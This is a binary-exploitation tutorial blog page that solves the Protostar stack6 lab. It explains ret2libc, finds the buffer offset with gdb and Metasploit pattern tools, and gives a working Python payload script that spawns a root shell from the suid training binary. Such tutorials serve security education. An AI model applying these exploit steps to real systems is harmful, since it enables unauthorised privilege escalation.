<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6 - 0xRick’s Blog</title>
<meta name="description" content="In this binary exploitation post I show how to bypass non-executable stack protection (prevents executing shellcode) using a technique called re2libc. (x32)">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6">
<meta property="og:url" content="https://0xrick.github.io/binary-exploitation/bof6/">


  <meta property="og:description" content="In this binary exploitation post I show how to bypass non-executable stack protection (prevents executing shellcode) using a technique called re2libc. (x32)">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6">
  <meta name="twitter:description" content="In this binary exploitation post I show how to bypass non-executable stack protection (prevents executing shellcode) using a technique called re2libc. (x32)">
  <meta name="twitter:url" content="https://0xrick.github.io/binary-exploitation/bof6/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-03-20T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/binary-exploitation/bof6/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6">
    <meta itemprop="description" content='Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6IntroductionHey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in !Read the previous posts if you haven’t yet../stack6As always we are given the source code of the binary :#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void getpath(){        char buffer[64];        unsigned int ret;        printf("input path please: "); fflush(stdout);        gets(buffer);        ret = __builtin_return_address(0);        if((ret &amp; 0xbf000000) == 0xbf000000) {                printf("bzzzt (%p)\n", ret);                _exit(1);        }        printf("got path %s\n", buffer);}int main(int argc, char **argv){        getpath();}What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out:Our problem is this if statement :        if((ret &amp; 0xbf000000) == 0xbf000000) {                printf("bzzzt (%p)\n", ret);                _exit(1);        }This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc.ret2libcSo what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here).So finally our attack payload will be : “padding –&gt; address of system() –&gt; address of exit() –&gt; /bin/sh” instead of : “padding –&gt; new return address –&gt; NOP –&gt; shellcode”.Now let’s see how will we do it.ExploiationAgain , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find :find /opt/protostar/bin/ -perm -4000 | grep stack6As you can see stack6 is an suid binary.So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL :Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELLBut I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address.Code :#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char **argv){        char *ptr = getenv("SHELL");        if (ptr != NULL)        {                printf("Estimated address: %p\n", ptr);                return 0;        }}Then we will compile it : gcc address.c -o address :As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address.Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools../pattern_create.rb -l 100We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb :./pattern_offset.rb -q 0x37634136So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit :Address of system : 0xb7ecffb0Address of exit : 0xb7ec60c0Lastly we will check the address of SHELL again because it’s subject to change :Address : 0xbffff985 Let’s check our notes :Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s.buffer = "A" * 80Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses.system = struct.pack("I" ,0xb7ecffb0)exit = struct.pack("I" ,0xb7ec60c0)shell = struct.pack("I" ,0xbffff985)And finally we will print the payload.print buffer + system + exit + shellFinal script :import structbuffer = "A" * 80system = struct.pack("I" ,0xb7ecffb0)exit = struct.pack("I" ,0xb7ec60c0)shell = struct.pack("I" ,0xbffff985)print buffer + system + exit + shellWe have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 :And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 :python /tmp/stack6.py &gt; /tmp/payloadcat /tmp/payload - | ./stack6root shell!So after editing the address of shell variable , the script will be like this :import structbuffer = "A" * 80system = struct.pack("I" ,0xb7ecffb0)exit = struct.pack("I" ,0xb7ec60c0)shell = struct.pack("I" ,0xbffff992)print buffer + system + exit + shellThat’s it , Feedback is appreciated !Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Binary Exploitation article : Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5'>
    <meta itemprop="datePublished" content="2019-03-20T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/binary-exploitation/bof6/" class="u-url" itemprop="url">Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-03-20T07:00:00+02:00">March 20, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          5 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#buffer-overflow-examples-bypassing-non-executable-stack-by-re2libc---protostar-stack6">Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6</a><ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#stack6">./stack6</a></li>
<li><a href="#ret2libc">ret2libc</a></li>
<li><a href="#exploiation">Exploiation</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="buffer-overflow-examples-bypassing-non-executable-stack-by-re2libc---protostar-stack6">Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6</h1>

<h2 id="introduction">Introduction</h2>
<p>Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in !
Read the <a href="/categories/#binary-exploitation">previous posts</a> if you haven’t yet.<br>
<br><img src="/images/binary-exploitation/BOF6/0.png" alt="" class="align-center"><br><br></p>

<h2 id="stack6">./stack6</h2>
<p>As always we are given the source code of the binary :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">getpath</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"input path please: "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

        <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

        <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

        <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
        <span class="n">getpath</span><span class="p">();</span>



<span class="p">}</span>
</code></pre></div></div>
<p>What this code is doing is just printing <code class="language-plaintext highlighter-rouge">input path please:</code> then it stores our input in a buffer of 64 chars and finally it prints it out:
<br><img src="/images/binary-exploitation/BOF6/1.png" alt="" class="align-center"><br><br>
Our problem is this <code class="language-plaintext highlighter-rouge">if</code> statement :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>
<p>This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the <a href="/binary-exploitation/bof5/">previous example</a>. We can defeat this by a technique called ret2libc.<br></p>

<h2 id="ret2libc">ret2libc</h2>
<p>So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function <code class="language-plaintext highlighter-rouge">system()</code> and make it execute <code class="language-plaintext highlighter-rouge">/bin/sh</code>. (Read about <code class="language-plaintext highlighter-rouge">system()</code> <a href="https://www.tutorialspoint.com/c_standard_library/c_function_system.htm" target="_blank" rel="noopener noreferrer">here</a>). We will also need to use the function <code class="language-plaintext highlighter-rouge">exit()</code> to make the program exit cleanly. (Read about <code class="language-plaintext highlighter-rouge">exit()</code> <a href="https://www.tutorialspoint.com/c_standard_library/c_function_exit.htm" target="_blank" rel="noopener noreferrer">here</a>).<br>
So finally our attack payload will be : “padding –&gt; address of <code class="language-plaintext highlighter-rouge">system()</code> –&gt; address of <code class="language-plaintext highlighter-rouge">exit()</code> –&gt; <code class="language-plaintext highlighter-rouge">/bin/sh</code>” instead of : “padding –&gt; new return address –&gt; NOP –&gt; shellcode”.<br>
Now let’s see how will we do it.<br></p>

<h2 id="exploiation">Exploiation</h2>
<p>Again , this will execute <code class="language-plaintext highlighter-rouge">/bin/sh</code> as root because this binary is an <code class="language-plaintext highlighter-rouge">suid</code> binary. If it wasn’t <code class="language-plaintext highlighter-rouge">suid</code> we would get a shell as the same user. We can check by using <code class="language-plaintext highlighter-rouge">find</code> :
<code class="language-plaintext highlighter-rouge">find /opt/protostar/bin/ -perm -4000 | grep stack6</code>
<br><img src="/images/binary-exploitation/BOF6/2.png" alt="" class="align-center"><br><br>
As you can see <code class="language-plaintext highlighter-rouge">stack6</code> is an <code class="language-plaintext highlighter-rouge">suid</code> binary.<br>
So first of all , after we call <code class="language-plaintext highlighter-rouge">system()</code> we will need to give it <code class="language-plaintext highlighter-rouge">/bin/sh</code> , how will we do that ? A nice way to do it is to store <code class="language-plaintext highlighter-rouge">/bin/sh</code> in an environment variable. I created a variable and called it <code class="language-plaintext highlighter-rouge">SHELL</code> :
<br><img src="/images/binary-exploitation/BOF6/3.png" alt="" class="align-center"><br><br>
Now we need to find the address of that variable , we can do it from <code class="language-plaintext highlighter-rouge">gdb</code> by setting a breakpoint at main , then running the program and doing this : <code class="language-plaintext highlighter-rouge">x/s *((char **)environ+x)</code> where <code class="language-plaintext highlighter-rouge">x</code> is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of <code class="language-plaintext highlighter-rouge">SHELL</code>
<br>But I found a better way to do it when I was reading an article on <a href="https://www.shellblade.net/" target="_blank" rel="noopener noreferrer">shellblade</a>. We will use a <code class="language-plaintext highlighter-rouge">c</code> program to tell us the estimated address.<br>
Code :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"SHELL"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Estimated address: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br><img src="/images/binary-exploitation/BOF6/4.png" alt="" class="align-center"><br><br>
Then we will compile it : <code class="language-plaintext highlighter-rouge">gcc address.c -o address</code> :
<br><img src="/images/binary-exploitation/BOF6/5.png" alt="" class="align-center"><br><br>
As you can see it’s telling us the address of the environment variable <code class="language-plaintext highlighter-rouge">SHELL</code>. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address.<br>
Let’s start by finding the offset. As we did before we will use <code class="language-plaintext highlighter-rouge">pattern_create.rb</code> and <code class="language-plaintext highlighter-rouge">pattern_offset.rb</code> from metasploit exploitation tools.<br>
<code class="language-plaintext highlighter-rouge">./pattern_create.rb -l 100</code>
<br><img src="/images/binary-exploitation/BOF6/6.png" alt="" class="align-center"><br><br>
We have our pattern now let’s run the program in gdb and set a breakpoint before main <code class="language-plaintext highlighter-rouge">break *main</code>. Then we will type <code class="language-plaintext highlighter-rouge">c</code> to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : 
<br><img src="/images/binary-exploitation/BOF6/7.png" alt="" class="align-center"><br><br>
We got the address <code class="language-plaintext highlighter-rouge">0x37634136</code> , now let’s go back and use <code class="language-plaintext highlighter-rouge">pattern_offset.rb</code> :
<code class="language-plaintext highlighter-rouge">./pattern_offset.rb -q 0x37634136</code>
<br><img src="/images/binary-exploitation/BOF6/8.png" alt="" class="align-center"><br><br>
So after 80 chars the buffer overflows. Next thing to check is the addresses of <code class="language-plaintext highlighter-rouge">system()</code> and <code class="language-plaintext highlighter-rouge">exit()</code>. From gdb we will set a break point at main and type <code class="language-plaintext highlighter-rouge">r</code> to run the program. After it reaches the break point and breaks we can get the address of system by typing <code class="language-plaintext highlighter-rouge">p system</code> and we will do the same thing for exit <code class="language-plaintext highlighter-rouge">p exit</code> :
<br><img src="/images/binary-exploitation/BOF6/9.png" alt="" class="align-center"><br><br>
Address of system : <code class="language-plaintext highlighter-rouge">0xb7ecffb0</code>
Address of exit : <code class="language-plaintext highlighter-rouge">0xb7ec60c0</code>
Lastly we will check the address of <code class="language-plaintext highlighter-rouge">SHELL</code> again because it’s subject to change :
<br><img src="/images/binary-exploitation/BOF6/10.png" alt="" class="align-center"><br><br>
Address : <code class="language-plaintext highlighter-rouge">0xbffff985</code> 
Let’s check our notes :
<br><img src="/images/binary-exploitation/BOF6/11.png" alt="" class="align-center"><br><br>
Ok , we are ready to write our exploit , we will use struct <code class="language-plaintext highlighter-rouge">import struct</code> like we did before. We will create a variable for the chars we will use to fill the buffer and call it <code class="language-plaintext highlighter-rouge">buffer</code> , its value will be 80 A’s.<br>
<code class="language-plaintext highlighter-rouge">buffer = "A" * 80</code>
<br>Then we will create 3 variables to hold the addresses of <code class="language-plaintext highlighter-rouge">system()</code> , <code class="language-plaintext highlighter-rouge">exit()</code> and <code class="language-plaintext highlighter-rouge">SHELL</code>. We will use struct to reverse the addresses.<br>
<br><code class="language-plaintext highlighter-rouge">system = struct.pack("I" ,0xb7ecffb0)</code>
<br><code class="language-plaintext highlighter-rouge">exit = struct.pack("I" ,0xb7ec60c0)</code>
<br><code class="language-plaintext highlighter-rouge">shell = struct.pack("I" ,0xbffff985)</code>
<br>And finally we will print the payload.<br>
<code class="language-plaintext highlighter-rouge">print buffer + system + exit + shell</code>
<br>Final script :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">80</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span> <span class="p">,</span><span class="mh">0xb7ecffb0</span><span class="p">)</span>
<span class="nb">exit</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span> <span class="p">,</span><span class="mh">0xb7ec60c0</span><span class="p">)</span>
<span class="n">shell</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span> <span class="p">,</span><span class="mh">0xbffff985</span><span class="p">)</span>

<span class="k">print</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">shell</span>
</code></pre></div></div>
<p><br><img src="/images/binary-exploitation/BOF6/12.png" alt="" class="align-center"><br><br>
We have to remember that the address of <code class="language-plaintext highlighter-rouge">SHELL</code> is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. <code class="language-plaintext highlighter-rouge">python /tmp/stack6.py &gt; /tmp/payload</code> , Then we will cat the file and pipe the output to <code class="language-plaintext highlighter-rouge">./stack6</code> :
<br><img src="/images/binary-exploitation/BOF6/13.png" alt="" class="align-center"><br><br>
And no shell , After going up and down by editing the address in the python script I finally got the right address which is <code class="language-plaintext highlighter-rouge">0xbffff992</code> :
<br><code class="language-plaintext highlighter-rouge">python /tmp/stack6.py &gt; /tmp/payload</code>
<br><code class="language-plaintext highlighter-rouge">cat /tmp/payload - | ./stack6</code>
<br><img src="/images/binary-exploitation/BOF6/14.png" alt="" class="align-center"><br><br>
root shell!
<br>So after editing the address of <code class="language-plaintext highlighter-rouge">shell</code> variable , the script will be like this :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">80</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span> <span class="p">,</span><span class="mh">0xb7ecffb0</span><span class="p">)</span>
<span class="nb">exit</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span> <span class="p">,</span><span class="mh">0xb7ec60c0</span><span class="p">)</span>
<span class="n">shell</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span> <span class="p">,</span><span class="mh">0xbffff992</span><span class="p">)</span>

<span class="k">print</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">shell</span>
</code></pre></div></div>
<p><br><img src="/images/binary-exploitation/BOF6/15.png" alt="" class="align-center"><br><br></p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Binary Exploitation article : <a href="/binary-exploitation/bof5/">Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-20T07:00:00+02:00">March 20, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/carrier/" class="pagination--pager" title="Hack The Box - Carrier
">Previous</a>
    
    
      <a href="/hack-the-box/curling/" class="pagination--pager" title="Hack The Box - Curling
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
